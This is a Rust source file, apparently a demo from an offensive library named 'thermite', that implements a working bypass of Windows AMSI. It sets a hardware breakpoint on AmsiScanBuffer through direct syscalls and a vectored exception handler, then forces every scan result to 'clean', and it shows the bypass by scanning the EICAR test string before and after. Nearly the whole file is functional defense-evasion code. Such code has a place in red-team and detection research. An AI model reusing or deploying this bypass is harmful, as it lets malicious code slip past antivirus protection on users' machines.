#![allow(nonstandard_style)]


use std::ffi::CString;
use std::mem::transmute;
use std::ptr::null_mut;

use ntapi::ntpsapi::{NtCurrentThread, NtGetContextThread};
use winapi::{
	ctypes::c_void,
	shared::minwindef::ULONG,
	shared::ntdef::HRESULT,
	um::{
		errhandlingapi::AddVectoredExceptionHandler,
		libloaderapi::LoadLibraryA,
		winnt::{CONTEXT, CONTEXT_DEBUG_REGISTERS, HANDLE, PVOID}
	}
};

use thermite::{debug, direct_syscall, error, info};
use thermite::breakpoints::{DebugRegister, get_arguments, register_callback, rip_to_return_address, set_breakpoint, set_resume_flag, set_ret_value};
use thermite::peb_walk::{get_function_address, get_module_handle};


pub type HAMSICONTEXT = *mut c_void;
pub type HAMSISESSION = *mut c_void;
pub type AMSI_RESULT = i32;
pub type LPCWSTR = *const u16;
pub type LPCVOID = *const c_void;

#[link(name="amsi")]
extern "system" {
	pub fn AmsiInitialize(appName: LPCWSTR, amsiContext: *mut HAMSICONTEXT) -> HRESULT;
	pub fn AmsiUninitialize(amsiContext: HAMSICONTEXT);
	pub fn AmsiOpenSession(amsiContext: HAMSICONTEXT, amsiSession: *mut HAMSISESSION) -> HRESULT;
	pub fn AmsiCloseSession(amsiContext: HAMSICONTEXT, amsiSession: HAMSISESSION);
	pub fn AmsiScanBuffer(
		amsiContext: HAMSICONTEXT,
		buffer: LPCVOID,
		length: ULONG,
		contentName: LPCWSTR,
		session: HAMSISESSION,
		result: *mut AMSI_RESULT
	) -> HRESULT;
}


// This function sets up the hardware breakpoint
// It will load AMSI.dll if it is not already loaded, so it can find the address of AmsiScanBuffer
// Then set up a hook with hardware breakpoints at the function's address, so we can hijack the execution
fn setup() -> Result<PVOID, String> {
	let amsiscanbuffer_handle: *const u8;
	let mut thread_ctx: CONTEXT = unsafe { std::mem::zeroed() };
	thread_ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	// debug!(std::mem::align_of::<HANDLE>());

	let status = direct_syscall!("NtGetContextThread", -2i32 as HANDLE, &mut thread_ctx);
	if status != 0 { return Err(format!("Failed to get context thread: {status:x}")) };

	unsafe {
		let module_name = CString::new("amsi.dll").unwrap();
		let module_handle = get_module_handle("amsi.dll").unwrap_or(LoadLibraryA(module_name.as_ptr()));
		amsiscanbuffer_handle = get_function_address("AmsiScanBuffer", module_handle as _).unwrap();
		if amsiscanbuffer_handle.is_null() { return Err("Failed to get AmsiScanBuffer address".to_string()) };
	}

	// We register our VEH, i just use the one i made in thermite::breakpoints, no reason to change something that works
	let veh = unsafe { AddVectoredExceptionHandler(1, Some(thermite::breakpoints::vectored_handler)) };
	if veh.is_null() { return Err("Failed to add exception handler".to_string()) };

	// No idea why, but NtGetContextThread (on line 57) fails when i use this function
	// Fails with status 0x80000002 which is STATUS_DATATYPE_MISALIGNMENT - but there is no changes in alignment of anything ... super weird 
	// unsafe { set_breakpoint(DebugRegister::DR0, amsiscanbuffer_handle, &mut thread_ctx, transmute(callback as fn(_))) };

	// So fuck it let's set up the breakpoint manually then (it does exactly the same stuff than set_breakpoint() .... )
	thread_ctx.Dr0 = amsiscanbuffer_handle as u64;
	thread_ctx.Dr7 |= 1;
	unsafe { register_callback(DebugRegister::DR0, transmute(callback as fn(_))); }

	// Set the context - "Saves" our breakpoints
	let status = direct_syscall!("NtSetContextThread", NtCurrentThread, &mut thread_ctx);
	if status != 0 { return Err(format!("Failed to set context thread: {status:x}")) };
	Ok(veh)
}

// Simple function that calls AmsiScanBuffer on the EICAR test string and display the results
// The EICAR string is a test string used as a test for antiviruses,
// it's pretty much universally recognized as an IOC and should be detected by every half-decent security product
// So if we can get this past AMSI, i think we're good
fn scan_sample(amsi_ctx: *mut c_void, amsi_session: *mut c_void, mut res: HRESULT) -> HRESULT {
	let eicar_string = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
	let name_utf16: Vec<u16> = "TestSession123".encode_utf16().chain(std::iter::once(0)).collect();

	unsafe { AmsiScanBuffer(
		amsi_ctx,
		eicar_string.as_ptr() as *const c_void,
		eicar_string.len() as ULONG,
		name_utf16.as_ptr(),
		amsi_session,
		&mut res) };
	println!("\t> Scan Result: {res:#x}");
	match res {
		0 => println!("\t> The sample is clean"),
		1 => println!("\t> The sample may be clean"),
		0x4000..=0x4fff => println!("\t> The scan was blocked by an admin"),
		0x8000.. => println!("\t> The sample is definitely malware"),
		_ => println!("\t> ???"),
	}
	res
}


fn callback(ctx: &mut CONTEXT) {
	let result_ptr = get_arguments(ctx, 5) as *mut u32;

	// The last argument of AmsiScanBuffer is a pointer to the results ( &mut results )
	// So we need to derefence it to access its value or to modify it
	unsafe { println!("\t> AMSI really scanned: {:#x}", (*result_ptr)); }
	info!("But let's change it to 0 o/");
	unsafe { *result_ptr = 0; }

	rip_to_return_address(ctx);     // We set the instruction pointer to the return address
	set_ret_value(0, ctx);    // We set the return value to 0 (meaning everything is okay, c.f. AmsiScanBuffer's signature)
	set_resume_flag(ctx)            // We set the resume flag to 1 to allow AmsiScanBuffer to continue executing (but only to return)
}

fn main() {
	// Initializing some stuff for AMSI
	let mut amsi_ctx = null_mut();
	let mut amsi_session = null_mut();
	let res = unsafe { AmsiInitialize("Test Name".encode_utf16().collect::<Vec<u16>>().as_ptr(), &mut amsi_ctx) };
	if res != 0 { error!("Failed to initialize AMSI..."); return; }
	unsafe { AmsiOpenSession(amsi_ctx, &mut amsi_session) };

	// Then we scan a first sample, before the bypass is set
	info!("Scanning the sample...");
	scan_sample(amsi_ctx, amsi_session, res);

	// Set-up the bypass and handle any potential errors
	match setup() {
		Ok(_) => { info!("Successfully set up breakpoint") },
		Err(e) => { error!(e); return; }
	};

	// We scan the sample a second time, this time with the hardware breakpoint set at AmsiScanBuffer's address
	info!("Let's scan the same sample with the bypass active");
	if scan_sample(amsi_ctx, amsi_session, res) == 0 {
		println!("[^o^]/ Hell yeah !");	 // res == 0 means AMSI said the sample was clean :D
	} else {
		error!("oh no");
	}
	
	unsafe {
		AmsiCloseSession(amsi_ctx, amsi_session);
		AmsiUninitialize(amsi_ctx);
	}
}